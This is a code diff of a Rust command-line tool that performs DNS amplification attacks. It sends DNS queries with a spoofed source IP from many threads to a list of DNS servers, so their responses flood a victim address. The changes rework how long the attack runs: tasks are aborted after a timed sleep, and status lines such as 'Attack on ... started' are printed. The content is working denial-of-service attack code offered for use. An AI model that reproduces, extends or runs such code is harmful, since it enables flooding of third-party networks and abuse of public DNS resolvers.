@@ -13,7 +13,7 @@ use std::io::{self, BufRead, BufReader};
 use std::net::{IpAddr, SocketAddr};
 use std::str::FromStr;
 use std::time::Duration;
-use tokio;
+use tokio::{self};
 use trust_dns_proto::rr::record_type::RecordType;
 use trust_dns_resolver::config::ResolverOpts;
 use trust_dns_resolver::{
@@ -93,32 +93,14 @@ async fn amplify(
     domain: &str,
     source_ip: &str,
     record_type: RecordType,
-    time: Option<u32>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let source_ip = IpAddr::from_str(source_ip)?;
-
-    if time.is_none() {
-        loop {
-            for dns_server in dns_servers {
-                let dns_server = IpAddr::from_str(&dns_server)?;
-                send_dns_query(dns_server, domain, source_ip, record_type).await?;
-            }
-        }
-    } else {
-        let time = time.unwrap();
-        let time = Duration::from_secs(time as u64);
-
-        let start = tokio::time::Instant::now();
-
-        while start.elapsed() < time {
-            for dns_server in dns_servers {
-                let dns_server = IpAddr::from_str(&dns_server)?;
-                send_dns_query(dns_server, domain, source_ip, record_type).await?;
-            }
+    loop {
+        for dns_server in dns_servers {
+            let dns_server = IpAddr::from_str(&dns_server)?;
+            send_dns_query(dns_server, domain, source_ip, record_type).await?;
         }
     }
-
-    Ok(())
 }
 
 #[derive(Parser, Debug)]
@@ -140,7 +122,7 @@ struct Args {
     server_list: Option<String>,
     /// Time the attack should run
     #[arg(short, long, required = false)]
-    time: Option<u32>,
+    time: Option<u64>,
     /// Domain to resolve
     #[arg(
         short = 'd',
@@ -178,23 +160,41 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     for _ in 0..threads {
         let dns_servers = dns_servers.clone();
         let source_ip = source_ip.to_string();
-        let time = time.clone();
         let domain = domain.clone();
 
-        let handle = tokio::spawn(async move {
-            amplify(&dns_servers, &domain, &source_ip, record_type, time).await
-        });
+        let handle =
+            tokio::spawn(
+                async move { amplify(&dns_servers, &domain, &source_ip, record_type).await },
+            );
 
         handles.push(handle);
     }
 
-    for handle in handles {
-        match handle.await {
-            Ok(_result) => {
-                println!("Attack on {} finished", colorize(&source_ip, "red"));
-            }
-            Err(error) => {
-                eprintln!("Error occurred: {}", error);
+    println!(
+        "Attack on {} started with {} threads...",
+        colorize(source_ip, "green"),
+        colorize(&threads.to_string(), "red")
+    );
+
+    if let Some(time) = time {
+        tokio::time::sleep(Duration::from_secs(time)).await;
+        for handle in handles {
+            handle.abort();
+        }
+        println!(
+            "Attack on {} for {} seconds finished...",
+            colorize(source_ip, "green"),
+            colorize(&time.to_string(), "red")
+        );
+    } else {
+        for handle in handles {
+            match handle.await {
+                Ok(_result) => {
+                    println!("Attack on {} finished...", colorize(&source_ip, "red"));
+                }
+                Err(error) => {
+                    eprintln!("Error occurred: {}", error);
+                }
             }
         }
     }
